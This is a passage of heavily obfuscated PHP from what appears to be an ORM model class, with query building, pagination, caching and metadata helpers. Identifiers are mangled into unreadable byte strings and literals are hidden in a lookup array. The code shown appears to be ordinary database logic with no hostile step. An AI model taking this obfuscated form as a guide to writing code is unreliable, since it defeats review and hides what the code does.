strpos($˜‘¢‘…‡[0], $é¹òã[50])) { $˜‘¢‘…‡[0] = explode($é¹òã[50], $˜‘¢‘…‡[0]); } $–èÊ¢áö = array(); if (is_array($˜‘¢‘…‡[0])) { foreach ($˜‘¢‘…‡[0] as $±ˆ­½áù) { $–èÊ¢áö[$±ˆ­½áù] = $¤‚€€àö[$±ˆ­½áù]; } } else { $–èÊ¢áö[$˜‘¢‘…‡[0]] = $¤‚€€àö[$˜‘¢‘…‡[0]]; } if (!empty($¤‚€€àö[$this->getPk()])) { $–èÊ¢áö[$this->getPk()] = array($é¹òã[407], $¤‚€€àö[$this->getPk()]); } if ($this->where($–èÊ¢áö)->find()) { return !1; } return !0; default: return $this->check($¤‚€€àö[$˜‘¢‘…‡[0]], $˜‘¢‘…‡[1], $˜‘¢‘…‡[4]); } } public function check($’—Àå¹î, $ßÑàâ†, $»úÉš¼â = "\162\145\x67\x65\x78") { $Ô®ŞÊ±æ =& $_SERVER[¢ñàß¿€]; $»úÉš¼â = strtolower(trim($»úÉš¼â)); switch ($»úÉš¼â) { case $Ô®ŞÊ±æ[7]: case $Ô®ŞÊ±æ[408]: $ÁÙ›ˆ¾® = is_array($ßÑàâ†) ? $ßÑàâ† : explode($Ô®ŞÊ±æ[50], $ßÑàâ†); return $»úÉš¼â == $Ô®ŞÊ±æ[7] ? in_array($’—Àå¹î, $ÁÙ›ˆ¾®) : !in_array($’—Àå¹î, $ÁÙ›ˆ¾®); case $Ô®ŞÊ±æ[409]: case $Ô®ŞÊ±æ[410]: if (is_array($ßÑàâ†)) { $²—ÑÀóÕ = $ßÑàâ†[0]; $üõÁÏáÔ = $ßÑàâ†[1]; } else { list($²—ÑÀóÕ, $üõÁÏáÔ) = explode($Ô®ŞÊ±æ[50], $ßÑàâ†); } return $»úÉš¼â == $Ô®ŞÊ±æ[409] ? $’—Àå¹î >= $²—ÑÀóÕ && $’—Àå¹î <= $üõÁÏáÔ : $’—Àå¹î < $²—ÑÀóÕ || $’—Àå¹î > $üõÁÏáÔ; case $Ô®ŞÊ±æ[411]: case $Ô®ŞÊ±æ[412]: return $»úÉš¼â == $Ô®ŞÊ±æ[411] ? $’—Àå¹î == $ßÑàâ† : $’—Àå¹î != $ßÑàâ†; case $Ô®ŞÊ±æ[413]: $é€áøåµ = mb_strlen($’—Àå¹î, $Ô®ŞÊ±æ[414]); if (strpos($ßÑàâ†, $Ô®ŞÊ±æ[50])) { list($²—ÑÀóÕ, $üõÁÏáÔ) = explode($Ô®ŞÊ±æ[50], $ßÑàâ†); return $é€áøåµ >= $²—ÑÀóÕ && $é€áøåµ <= $üõÁÏáÔ; } else { return $é€áøåµ == $ßÑàâ†; } case $Ô®ŞÊ±æ[415]: list($úÂ÷È¼, $ƒÍ¨öÛ›) = explode($Ô®ŞÊ±æ[50], $ßÑàâ†); if (!is_numeric($úÂ÷È¼)) { $úÂ÷È¼ = strtotime($úÂ÷È¼); } if (!is_numeric($ƒÍ¨öÛ›)) { $ƒÍ¨öÛ› = strtotime($ƒÍ¨öÛ›); } return NOW_TIME >= $úÂ÷È¼ && NOW_TIME <= $ƒÍ¨öÛ›; case $Ô®ŞÊ±æ[416]: return in_array(get_client_ip(), explode($Ô®ŞÊ±æ[50], $ßÑàâ†)); case $Ô®ŞÊ±æ[417]: return !in_array(get_client_ip(), explode($Ô®ŞÊ±æ[50], $ßÑàâ†)); case $Ô®ŞÊ±æ[404]: default: return $this->regex($’—Àå¹î, $ßÑàâ†); } } public function query($Ÿ«áÅ¦, $Ÿ°íë¥” = false) { $¡Ö˜¦ó =& $_SERVER[¢ñàß¿€]; if (!is_bool($Ÿ°íë¥”) && !is_array($Ÿ°íë¥”)) { $Ÿ°íë¥” = func_get_args(); array_shift($Ÿ°íë¥”); } $Ÿ«áÅ¦ = str_replace(array($¡Ö˜¦ó[262], $¡Ö˜¦ó[418]), $¡Ö˜¦ó[53], $Ÿ«áÅ¦); $Ÿ«áÅ¦ = $this->parseSql($Ÿ«áÅ¦, $Ÿ°íë¥”); return $this->db->query($Ÿ«áÅ¦); } public function execute($£³Œìá, $¿Ä£“ê‰ = false) { if (!is_bool($¿Ä£“ê‰) && !is_array($¿Ä£“ê‰)) { $¿Ä£“ê‰ = func_get_args(); array_shift($¿Ä£“ê‰); } $£³Œìá = $this->parseSql($£³Œìá, $¿Ä£“ê‰); return $this->db->execute($£³Œìá); } protected function parseSql($•¹ğ¯€, $à˜×æß²) { $ ÅÚ©Ş¼ =& $_SERVER[¢ñàß¿€]; if (!0 === $à˜×æß²) { $ÎäŒ…© = $this->_parseOptions(); $•¹ğ¯€ = $this->db->parseSql($•¹ğ¯€, $ÎäŒ…©); } elseif (is_array($à˜×æß²)) { $à˜×æß² = array_map(array($this->db, $ ÅÚ©Ş¼[419]), $à˜×æß²); $•¹ğ¯€ = vsprintf($•¹ğ¯€, $à˜×æß²); } else { $•¹ğ¯€ = strtr($•¹ğ¯€, array($ ÅÚ©Ş¼[420] => $this->getTableName(), $ ÅÚ©Ş¼[421] => think_config($ ÅÚ©Ş¼[321]))); } $this->db->setModel($this->name); return $•¹ğ¯€; } public function db($ºÑß¬§Ì = '', $·Ôïàï = '', $‚¿§Ôù¿ = array()) { $Æ²²ö¬ =& $_SERVER[¢ñàß¿€]; if ($Æ²²ö¬[12] === $ºÑß¬§Ì && $this->db) { return $this->db; } static $‘—¶¤ = array(); static $êë÷¥¤ = array(); if (!isset($êë÷¥¤[$ºÑß¬§Ì]) || isset($êë÷¥¤[$ºÑß¬§Ì]) && $·Ôïàï && $‘—¶¤[$ºÑß¬§Ì] != $·Ôïàï) { if (!empty($·Ôïàï) && is_string($·Ôïàï) && !1 === strpos($·Ôïàï, $Æ²²ö¬[8])) { $·Ôïàï = think_config($·Ôïàï); } $ºÑß¬§Ì = think_guid($·Ôïàï); $êë÷¥¤[$ºÑß¬§Ì] = Db::getInstance($·Ôïàï); } elseif (NULL === $·Ôïàï) { $êë÷¥¤[$ºÑß¬§Ì]->close(); unset($êë÷¥¤[$ºÑß¬§Ì]); return; } if (!empty($‚¿§Ôù¿)) { if (is_string($‚¿§Ôù¿)) { parse_str($‚¿§Ôù¿, $‚¿§Ôù¿); } foreach ($‚¿§Ôù¿ as $Š—şºÈï => $”“¨€ñ) { $this->setProperty($Š—şºÈï, $”“¨€ñ); } } $‘—¶¤[$ºÑß¬§Ì] = $·Ôïàï; $this->db = $êë÷¥¤[$ºÑß¬§Ì]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Å¨ü„Úã = get_class($this); if ($Å¨ü„Úã == $_SERVER[¢ñàß¿€][422]) { return $this->name; } $this->name = substr($Å¨ü„Úã, 0, -5); } return $this->name; } public function getTableName() { $‡¥Ó½Éç =& $_SERVER[¢ñàß¿€]; if (empty($this->trueTableName)) { $ÓøÓõ·¤ = !empty($this->tablePrefix) ? $this->tablePrefix : $‡¥Ó½Éç[12]; if (!empty($this->tableName)) { $ÓøÓõ·¤ .= $this->tableName; } else { $ÓøÓõ·¤ .= think_parse_name($this->name); } $this->trueTableName = strtolower($ÓøÓõ·¤); } return (!empty($this->dbName) ? $this->dbName . $‡¥Ó½Éç[10] : $‡¥Ó½Éç[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Õ¤ûÇÅï =& $_SERVER[¢ñàß¿€]; return isset($this->fields[$Õ¤ûÇÅï[328]]) ? $this->fields[$Õ¤ûÇÅï[328]] : $this->pk; } public function getDbFields() { $¶ã©¾Ãú =& $_SERVER[¢ñàß¿€]; if (isset($this->options[$¶ã©¾Ãú[356]])) { $ç‹¹¹•¤ = $this->db->getFields($this->options[$¶ã©¾Ãú[356]]); return $ç‹¹¹•¤ ? array_keys($ç‹¹¹•¤) : !1; } if ($this->fields) { $ç‹¹¹•¤ = $this->fields; unset($ç‹¹¹•¤[$¶ã©¾Ãú[327]], $ç‹¹¹•¤[$¶ã©¾Ãú[328]], $ç‹¹¹•¤[$¶ã©¾Ãú[329]], $ç‹¹¹•¤[$¶ã©¾Ãú[326]]); return $ç‹¹¹•¤; } return !1; } public function data($šÛÍÏ°Ç = '') { $æ˜É‡•à =& $_SERVER[¢ñàß¿€]; if ($æ˜É‡•à[12] === $šÛÍÏ°Ç && !empty($this->data)) { return $this->data; } if (is_object($šÛÍÏ°Ç)) { $šÛÍÏ°Ç = get_object_vars($šÛÍÏ°Ç); } elseif (is_string($šÛÍÏ°Ç)) { parse_str($šÛÍÏ°Ç, $šÛÍÏ°Ç); } elseif (!is_array($šÛÍÏ°Ç)) { think_exception(think_lang($æ˜É‡•à[348])); } $this->data = $šÛÍÏ°Ç; return $this; } public function join($î©ÃÌ©«) { $ §·¾ôŠ =& $_SERVER[¢ñàß¿€]; if (is_array($î©ÃÌ©«)) { $this->options[$ §·¾ôŠ[359]] = $î©ÃÌ©«; } elseif (!empty($î©ÃÌ©«)) { $this->options[$ §·¾ôŠ[359]][] = $î©ÃÌ©«; } return $this; } public function union($ŠÎƒ’üñ, $€ƒ¯íÖï = false) { $×…”é¥³ =& $_SERVER[¢ñàß¿€]; if (empty($ŠÎƒ’üñ)) { return $this; } if ($€ƒ¯íÖï) { $this->options[$×…”é¥³[423]][$×…”é¥³[424]] = !0; } if (is_object($ŠÎƒ’üñ)) { $ŠÎƒ’üñ = get_object_vars($ŠÎƒ’üñ); } if (is_string($ŠÎƒ’üñ)) { $“¥Í¿ĞÄ = $ŠÎƒ’üñ; } elseif (is_array($ŠÎƒ’üñ)) { if (isset($ŠÎƒ’üñ[0])) { $this->options[$×…”é¥³[423]] = array_merge($this->options[$×…”é¥³[423]], $ŠÎƒ’üñ); return $this; } else { $“¥Í¿ĞÄ = $ŠÎƒ’üñ; } } else { think_exception(think_lang($×…”é¥³[348])); } $this->options[$×…”é¥³[423]][] = $“¥Í¿ĞÄ; return $this; } public function cache($ƒà†ûù¦ = true, $¬Ô­ƒõ = null, $Áüöè… = '') { $±êåŞ¥™ =& $_SERVER[¢ñàß¿€]; if (!1 !== $ƒà†ûù¦) { $this->options[$±êåŞ¥™[425]] = array($±êåŞ¥™[97] => $ƒà†ûù¦, $±êåŞ¥™[415] => $¬Ô­ƒõ, $±êåŞ¥™[33] => $Áüöè…); } return $this; } public function field($…¼õ¸Â, $ù¶İÏöš = false) { $¸ğ¯«œ =& $_SERVER[¢ñàß¿€]; if (!0 === $…¼õ¸Â) { $éıİ— = $this->getDbFields(); $…¼õ¸Â = $éıİ— ? $éıİ— : $¸ğ¯«œ[220]; } elseif ($ù¶İÏöš) { if (is_string($…¼õ¸Â)) { $…¼õ¸Â = explode($¸ğ¯«œ[50], $…¼õ¸Â); } $éıİ— = $this->getDbFields(); $…¼õ¸Â = $éıİ— ? array_diff($éıİ—, $…¼õ¸Â) : $…¼õ¸Â; } $this->options[$¸ğ¯«œ[350]] = $…¼õ¸Â; return $this; } public function scope($ºŒí Ï = '', $üşÒÌÅ = NULL) { $÷”¼Œ™ì =& $_SERVER[¢ñàß¿€]; if ($÷”¼Œ™ì[12] === $ºŒí Ï) { if (isset($this->_scope[$÷”¼Œ™ì[37]])) { $ô‚Æ¦•õ = $this->_scope[$÷”¼Œ™ì[37]]; } else { return $this; } } elseif (is_string($ºŒí Ï)) { $é¯ŸüŒ­ = explode($÷”¼Œ™ì[50], $ºŒí Ï); $ô‚Æ¦•õ = array(); foreach ($é¯ŸüŒ­ as $“Œ¡Éû¿) { if (!isset($this->_scope[$“Œ¡Éû¿])) { continue; } $ô‚Æ¦•õ = array_merge($ô‚Æ¦•õ, $this->_scope[$“Œ¡Éû¿]); } if (!empty($üşÒÌÅ) && is_array($üşÒÌÅ)) { $ô‚Æ¦•õ = array_merge($ô‚Æ¦•õ, $üşÒÌÅ); } } elseif (is_array($ºŒí Ï)) { $ô‚Æ¦•õ = $ºŒí Ï; } if (is_array($ô‚Æ¦•õ) && !empty($ô‚Æ¦•õ)) { $this->options = array_merge($this->options, array_change_key_case($ô‚Æ¦•õ)); } return $this; } public function where($¶¹æß´°, $ğ¶°äôÌ = null) { $¿ĞË½ =& $_SERVER[¢ñàß¿€]; if (!is_null($ğ¶°äôÌ) && is_string($¶¹æß´°)) { if (!is_array($ğ¶°äôÌ)) { $ğ¶°äôÌ = func_get_args(); array_shift($ğ¶°äôÌ); } $ğ¶°äôÌ = array_map(array($this->db, $¿ĞË½[419]), $ğ¶°äôÌ); $¶¹æß´° = vsprintf($¶¹æß´°, $ğ¶°äôÌ); } elseif (is_object($¶¹æß´°)) { $¶¹æß´° = get_object_vars($¶¹æß´°); } elseif (is_array($¶¹æß´°)) { foreach ($¶¹æß´° as $ú‰Úóû => $„î¶ºÉÍ) { if ((is_numeric($ú‰Úóû) || !$ú‰Úóû) && is_string($„î¶ºÉÍ)) { if (strpos($„î¶ºÉÍ, $¿ĞË½[426]) === 0) { continue; } think_trace($¿ĞË½[427], $¿ĞË½[12], $¿ĞË½[49]); die; } } } if (is_string($¶¹æß´°) && $¿ĞË½[12] != $¶¹æß´°) { $ßğÔ‡¤„ = array(); $ßğÔ‡¤„[$¿ĞË½[428]] = $¶¹æß´°; $¶¹æß´° = $ßğÔ‡¤„; } if (isset($this->options[$¿ĞË½[352]])) { $this->options[$¿ĞË½[352]] = array_merge($this->options[$¿ĞË½[352]], $¶¹æß´°); } else { $this->options[$¿ĞË½[352]] = $¶¹æß´°; } return $this; } public function limit($ˆ‡Ü…Ç©, $„º²¨ = null) { $ÎÓ³øŒß =& $_SERVER[¢ñàß¿€]; $this->options[$ÎÓ³øŒß[368]] = is_null($„º²¨) ? $ˆ‡Ü…Ç© : $ˆ‡Ü…Ç© . $ÎÓ³øŒß[50] . $„º²¨; return $this; } public function page($¾ƒ‰İØ’, $ø¿„–€® = null) { $òú¡ÁÓÇ =& $_SERVER[¢ñàß¿€]; $this->options[$òú¡ÁÓÇ[429]] = is_null($ø¿„–€®) ? $¾ƒ‰İØ’ : $¾ƒ‰İØ’ . $òú¡ÁÓÇ[50] . $ø¿„–€®; return $this; } public function comment($ÆÇƒüŒÊ) { $this->options[$_SERVER[¢ñàß¿€][430]] = $ÆÇƒüŒÊ; return $this; } public function setProperty($¼„„–Œ—, $ğî÷¼š) { if (property_exists($this, $¼„„–Œ—)) { $this->{$¼„„–Œ—} = $ğî÷¼š; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\x69\x66\x79\x54\151\155\x65", "\164\x69\x6d\145", "\151\156\163\x65\162\164\x2c\165\x70\144\x61\x74\145", "\146\165\x6e\143\164\x69\x6f\x6e"), array("\143\162\145\x61\164\x65\x54\x69\x6d\145", "\164\x69\155\x65", "\151\156\x73\145\x72\x74", "\x66\x75\x6e\x63\x74\151\157\156")); public function setDataAuto($Øã¯å‰²) { $this->dataAuto = $Øã¯å‰²; } public function __construct($‘»½ºï = '', $ó§£Óş¢ = '', $ÅŞ‚¾åÒ = '') { parent::__construct($‘»½ºï, $ó§£Óş¢, $ÅŞ‚¾åÒ); } protected $tableMeta = array(); protected function _beforeInsert(&$ä¦‹ÚŞÙ, $Å¢ƒ­Åã) { $êûİĞî =& $_SERVER[¢ñàß¿€]; if (!$this->checkDataAutoHas($êûİĞî[431])) { return; } $this->dataBeforeFilter($ä¦‹ÚŞÙ, $êûİĞî[431]); } protected function _beforeUpdate(&$ÒÃ™¸ƒÅ, $¤ †¿³Í) { $¿â“‡è© =& $_SERVER[¢ñàß¿€]; if (!$this->checkDataAutoHas($¿â“‡è©[432])) { return; } $this->dataBeforeFilter($ÒÃ™¸ƒÅ, $¿â“‡è©[432]); } protected function _afterSelect(&$ù­îê™£, $ÃÉ×Ø«) { if (!is_array($ù­îê™£)) { return; } if (!$this->checkDataAutoHas($_SERVER[¢ñàß¿€][433])) { return; } foreach ($ù­îê™£ as &$”¾ÇËş¢) { $this->dataAfterFilter($”¾ÇËş¢); } unset($”¾ÇËş¢); } protected function _afterFind(&$Îı„º®ó, $ÃœÕÅÏ¢) { if (!is_array($Îı„º®ó)) { return; } if (!$this->checkDataAutoHas($_SERVER[¢ñàß¿€][433])) { return; } $this->dataAfterFilter($Îı„º®ó); } public static function textEncode($•íß¤¼Š) { if (!$•íß¤¼Š) { return $•íß¤¼Š; } $Ïö”àˆ­ = json_encode($•íß¤¼Š); $Ïö”àˆ­ = preg_replace_callback($_SERVER[¢ñàß¿€][434], function ($ó‘Ÿ¸) { return addslashes($ó‘Ÿ¸[0]); }, $Ïö”àˆ­); return json_decode($Ïö”àˆ­); } public static function textDecode($›ØÍ˜¡) { $Ê‚Âµ¦Ñ =& $_SERVER[¢ñàß¿€]; $°®™Èâˆ = json_encode($›ØÍ˜¡); $°®™Èâˆ = preg_replace_callback($Ê‚Âµ¦Ñ[435], function ($—ªÉäÂ›) { return $_SERVER[¢ñàß¿€][100]; }, $°®™Èâˆ); return json_decode($°®™Èâˆ); } public function setAutoIncrement($¨‘åŸ½) { $œêŠ´Öí = array($this->getPk() => $¨‘åŸ½); $¢Ó¤Éò‚ = $this->data($œêŠ´Öí)->add(); if ($¢Ó¤Éò‚) { $this->delete($¢Ó¤Éò‚); } } public function getAutoIncrement() { $†éƒ¡…€ = $this->getTableName(); $üıæ®¤ = $this->max($this->getPk()); $İä˜Ÿ¤§ = $this->query("\163\150\x6f\x77\x20\x74\141\x62\x6c\x65\40\163\x74\141\164\x75\x73\x20\x77\150\145\162\145\x20\x4e\141\155\145\x3d\x27{$†éƒ¡…€}\x27"); $·Êõüœ = $İä˜Ÿ¤§[0][$_SERVER[¢ñàß¿€][436]]; $…Ñé÷Ì = max($üıæ®¤, $·Êõüœ); return $…Ñé÷Ì; } protected function _callBefore($Ô•‡é°˜, $§Ô§¥·†) { return $this->cacheCallCheck($Ô•‡é°˜, $§Ô§¥·†, !1); } protected function _callAfter($åÂ‚°ºƒ, $µğ–à…Ã) { return $this->cacheCallCheck($åÂ‚°ºƒ, $µğ–à…Ã, !0); } protected function cacheFunctionAlias($ƒõñƒîõ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($·‰àû‹¨, $˜ÚºİÜ, $•ËÌ¡ö  = false) { $…ı¨ıû = $this->cacheFunctionAlias($˜ÚºİÜ); if (!$…ı¨ıû) { return; } foreach ($…ı¨ıû as $ò§¥ßà => $»öä†’Ñ) { $Åİš­µà = $»öä†’Ñ[0]; $ø­‘»Õë = explode($_SERVER[¢ñàß¿€][50], $»öä†’Ñ[1]); if ($·‰àû‹¨ == $ò§¥ßà) { return $this->cacheFunctionGet($ò§¥ßà, $Åİš­µà); } if ($•ËÌ¡ö  && in_array($·‰àû‹¨, $ø­‘»Õë)) { $this->cacheFunctionClear($ò§¥ßà, $Åİš­µà); } } } public function cacheFunctionGet($ªøæ÷«í, $Î‚÷Ÿ¦Ö) { $¸êÌ×Ë = $this->cacheKeyMake($ªøæ÷«í, $Î‚÷Ÿ¦Ö); $àçİ€¼¶ = Cache::get($¸êÌ×Ë); if (!is_array($àçİ€¼¶)) { $àçİ€¼¶ = call_user_func_array(array($this, $ªøæ÷«í), array($Î‚÷Ÿ¦Ö, !0)); Cache::set($¸êÌ×Ë, $àçİ€¼¶); } return $àçİ€¼¶; } public function cacheFunctionClear($©§»‹ã, $›óš”š) { $¼åˆöÂµ = $›óš”š; if (!is_array($›óš”š)) { $¼åˆöÂµ = array($›óš”š); } foreach ($¼åˆöÂµ as $ßõüƒ‚Ü) { $¸äÁşè = $this->cacheKeyMake($©§»‹ã, $ßõüƒ‚Ü); Cache::remove($¸äÁşè); } } private function cacheKeyMake($÷Ÿ³ÔÓÂ, $í×ªê) { $Ÿ™î£Ç« =& $_SERVER[¢ñàß¿€]; return get_class($this) . $Ÿ™î£Ç«[11] . $÷Ÿ³ÔÓÂ . $Ÿ™î£Ç«[437] . $í×ªê; } protected function selectPageReset() { $­ÇÄê©ş =& $_SERVER[¢ñàß¿€]; if (isset($GLOBALS[$­ÇÄê©ş[438]])) { return; } $GLOBALS[$­ÇÄê©ş[438]] = isset($GLOBALS[$­ÇÄê©ş[7]][$­ÇÄê©ş[439]]) ? $GLOBALS[$­ÇÄê©ş[7]][$­ÇÄê©ş[439]] : !1; $GLOBALS[$­ÇÄê©ş[440]] = isset($GLOBALS[$­ÇÄê©ş[7]][$­ÇÄê©ş[429]]) ? $GLOBALS[$­ÇÄê©ş[7]][$­ÇÄê©ş[429]] : !1; $GLOBALS[$­ÇÄê©ş[7]][$­ÇÄê©ş[439]] = !1; $GLOBALS[$­ÇÄê©ş[7]][$­ÇÄê©ş[429]] = !1; } protected function selectPageRestore() { $úı°ÁÚÙ =& $_SERVER[¢ñàß¿€]; if (!isset($GLOBALS[$úı°ÁÚÙ[438]])) { return; } $GLOBALS[$úı°ÁÚÙ[7]][$úı°ÁÚÙ[439]] = $GLOBALS[$úı°ÁÚÙ[438]]; $GLOBALS[$úı°ÁÚÙ[7]][$úı°ÁÚÙ[429]] = $GLOBALS[$úı°ÁÚÙ[440]]; if ($GLOBALS[$úı°ÁÚÙ[7]][$úı°ÁÚÙ[439]] === !1) { unset($GLOBALS[$úı°ÁÚÙ[7]][$úı°ÁÚÙ[439]]); } if ($GLOBALS[$úı°ÁÚÙ[7]][$úı°ÁÚÙ[429]] === !1) { unset($GLOBALS[$úı°ÁÚÙ[7]][$úı°ÁÚÙ[429]]); } unset($GLOBALS[$úı°ÁÚÙ[438]]); unset($GLOBALS[$úı°ÁÚÙ[440]]); } protected function selectPage($¥ÏÍÙîĞ = 200, $‹òĞï = 1) { $«ÂØ»Ã¦ =& $_SERVER[¢ñàß¿€]; global $in; $¸µÑ­ŸÃ = $this->optionsValue(); $òì×ù ° = 50000; $¥ÏÍÙîĞ = isset($in[$«ÂØ»Ã¦[439]]) && $in[$«ÂØ»Ã¦[439]] ? $in[$«ÂØ»Ã¦[439]] : $¥ÏÍÙîĞ; if ($¥ÏÍÙîĞ === -1) { $in[$«ÂØ»Ã¦[439]] = !1; $òì×ù ° = 100000000; $¥ÏÍÙîĞ = $òì×ù °; } $£ùˆÆÍÖ = $¸µÑ­ŸÃ; $£ùˆÆÍÖ[$«ÂØ»Ã¦[441]] = array(); $¥ÏÍÙîĞ = intval($¥ÏÍÙîĞ); $¥ÏÍÙîĞ = $¥ÏÍÙîĞ <= 5 ? 5 : ($¥ÏÍÙîĞ >= $òì×ù ° ? $òì×ù ° : $¥ÏÍÙîĞ); $‹òĞï = intval(isset($in[$«ÂØ»Ã¦[429]]) && $in[$«ÂØ»Ã¦[429]] ? $in[$«ÂØ»Ã¦[429]] : $‹òĞï); $‹òĞï = $‹òĞï <= 1 ? 1 : $‹òĞï; $˜†¤ÂÖ = array(); $§Ç£·Í’ = 1; if ($‹òĞï == 1 && $§Ç£·Í’) { $this->optionsValue($¸µÑ­ŸÃ); $˜†¤ÂÖ = $this->page($‹òĞï, $¥ÏÍÙîĞ)->select(); $¼Üƒ´¼ = is_array($˜†¤ÂÖ) ? count($˜†¤ÂÖ) : 0; if ($¼Üƒ´¼ < $¥ÏÍÙîĞ) { $ÊÀÂ³Û = 1; } else { $this->optionsValue($£ùˆÆÍÖ); $¼Üƒ´¼ = intval($this->count()); $ÊÀÂ³Û = ceil($¼Üƒ´¼ / $¥ÏÍÙîĞ); } } else { $this->optionsValue($£ùˆÆÍÖ); $¼Üƒ´¼ = intval($this->count()); $ÊÀÂ³Û = ceil($¼Üƒ´¼ / $¥ÏÍÙîĞ); $‹òĞï = $‹òĞï >= $ÊÀÂ³Û ? $ÊÀÂ³Û : $‹òĞï; $this->optionsValue($¸µÑ­ŸÃ); $˜†¤ÂÖ = $this->page($‹òĞï, $¥ÏÍÙîĞ)->select(); } if (!is_array($˜†¤ÂÖ)) { $˜†¤ÂÖ = array(); } if ($ÊÀÂ³Û == 1) { $¼Üƒ´¼ = count($˜†¤ÂÖ); } $«ÒºçĞ÷ = array($«ÂØ»Ã¦[442] => array($«ÂØ»Ã¦[443] => $¼Üƒ´¼, $«ÂØ»Ã¦[439] => $¥ÏÍÙîĞ, $«ÂØ»Ã¦[429] => $‹òĞï, $«ÂØ»Ã¦[444] => $ÊÀÂ³Û), $«ÂØ»Ã¦[445] => $˜†¤ÂÖ); return $«ÒºçĞ÷; } protected function checkLength($ôŒ¹©ÕÀ, $±º¨¦¨€ = 0, $ğÒ‡‹ş‚ = '') { $ÇÒé•—š =& $_SERVER[¢ñàß¿€]; $±º¨¦¨€ = $±º¨¦¨€ ? $±º¨¦¨€ : 65536; if (!$ôŒ¹©ÕÀ || strlen($ôŒ¹©ÕÀ) < $±º¨¦¨€) { return; } $ğÒ‡‹ş‚ = $ğÒ‡‹ş‚ ? $ğÒ‡‹ş‚ . $ÇÒé•—š[74] : $ÇÒé•—š[12]; show_json($ğÒ‡‹ş‚ . LNG($ÇÒé•—š[446]) . "\x28{$±º¨¦¨€}\x29", !1); } protected function metaSet($—üìÆ¡ï, $ç¨¢™½µ = null, $êªÌ†äú = null) { $õÍûÚòŒ =& $_SERVER[¢ñàß¿€]; if (!$this->tableMeta || !$—üìÆ¡ï) { return !1; } $ÛèÍÈº = $this->tableMeta[$õÍûÚòŒ[447]]; $ö²À×åƒ = $this->tableMeta[$õÍûÚòŒ[448]]; $Óû÷†ÊÇ = Model($ö²À×åƒ); $ôÇŒ…Ó = array($ÛèÍÈº => $—üìÆ¡ï, $õÍûÚòŒ[449] => $ç¨¢™½µ); if (is_null($ç¨¢™½µ)) { return $Óû÷†ÊÇ->where(array($ÛèÍÈº => $—üìÆ¡ï))->delete(); } if (is_null($êªÌ†äú) && is_string($ç¨¢™½µ)) { return $Óû÷†ÊÇ->where($ôÇŒ…Ó)->delete(); } $½òè•õŒ = is_array($ç¨¢™½µ) ? $ç¨¢™½µ : array(); if (is_string($ç¨¢™½µ)) { $½òè•õŒ[$ç¨¢™½µ] = $êªÌ†äú; } $­¯†¡ñÄ = array(); foreach ($½òè•õŒ as $Ö¯ âû => $şÓ”¨°Ú) { if (is_null($şÓ”¨°Ú) && is_string($Ö¯ âû)) { $Óû÷†ÊÇ->where(array($ÛèÍÈº => $—üìÆ¡ï, $õÍûÚòŒ[449] => $Ö¯ âû))->delete(); continue; } $this->checkLength($şÓ”¨°Ú, !1, $ö²À×åƒ . $õÍûÚòŒ[4] . $Ö¯ âû); $­¯†¡ñÄ[] = array($ÛèÍÈº => $—üìÆ¡ï, $õÍûÚòŒ[97] => $Ö¯ âû, $õÍûÚòŒ[450] => $şÓ”¨°Ú); } $Êß¤‡òæ = $õÍûÚòŒ[451] . $ö²À×åƒ; CacheLock::lock($Êß¤‡òæ); $Óû÷†ÊÇ->where(array($ÛèÍÈº => $—üìÆ¡ï))->addAll($­¯†¡ñÄ, array(), !0); CacheLock::unlock($Êß¤‡òæ); return !0; } public function metaGet($ùİ·šÆ‰, $±¤şÛ = false) { $ÈÀÛ¶•õ =& $_SERVER[¢ñàß¿€]; if (!$this->tableMeta) { return array(); } $İØ˜ıì = $this->tableMeta[$ÈÀÛ¶•õ[447]]; $ŞˆĞø÷ = Model($this->tableMeta[$ÈÀÛ¶•õ[448]]); if ($±¤şÛ) { $Ïû¼Ù¤¤ = array($İØ˜ıì => $ùİ·šÆ‰, $ÈÀÛ¶•õ[97] => $±¤şÛ); return $ŞˆĞø÷->where($Ïû¼Ù¤¤)->getField($ÈÀÛ¶•õ[450]); } $Ïû¼Ù¤¤ = array($İØ˜ıì => $ùİ·šÆ‰); $Œ¥¶ Àö = $ŞˆĞø÷->field($ÈÀÛ¶•õ[452])->where($Ïû¼Ù¤¤)->select(); $Œ¥¶ Àö = array_to_keyvalue($Œ¥¶ Àö, $ÈÀÛ¶•õ[97], $ÈÀÛ¶•õ[450]); return $Œ¥¶ Àö; } private function checkDataAutoHas($ßùò•ï) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Çìö»ÙÀ) { if (in_array($ßùò•ï, explode($_SERVER[¢ñàß¿€][50], $Çìö»ÙÀ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$¡ÄÔŠœ, $ûú Ùµ³) { $Şˆ®Æ =& $_SERVER[¢ñàß¿€]; if (!is_array($¡ÄÔŠœ)) { return; } foreach ($this->dataAuto as $©„¬ø°°) { $àÎ½¡Íç = $©„¬ø°°[0]; if (!in_array($ûú Ùµ³, explode($Şˆ®Æ[50], $©„¬ø°°[2]))) { continue; } switch (trim($©„¬ø°°[3])) { case $Şˆ®Æ[397]: case $Şˆ®Æ[398]: $ïúÂªà = $©„¬ø°°[1]; $€Çù‘¾ó = isset($©„¬ø°°[4]) ? (array) $©„¬ø°°[4] : array(); if ($ïúÂªà == $Şˆ®Æ[206] && array_key_exists($àÎ½¡Íç, $¡ÄÔŠœ)) { if (!$¡ÄÔŠœ[$àÎ½¡Íç]) { unset($¡ÄÔŠœ[$àÎ½¡Íç]); } break; } if (isset($¡ÄÔŠœ[$àÎ½¡Íç])) { array_unshift($€Çù‘¾ó, $¡ÄÔŠœ[$àÎ½¡Íç]); } if ($Şˆ®Æ[397] == $©„¬ø°°[3]) { $¡ÄÔŠœ[$àÎ½¡Íç] = call_user_func_array($ïúÂªà, $€Çù‘¾ó); } else { $¡ÄÔŠœ[$àÎ½¡Íç] = call_user_func_array(array(&$this, $ïúÂªà), 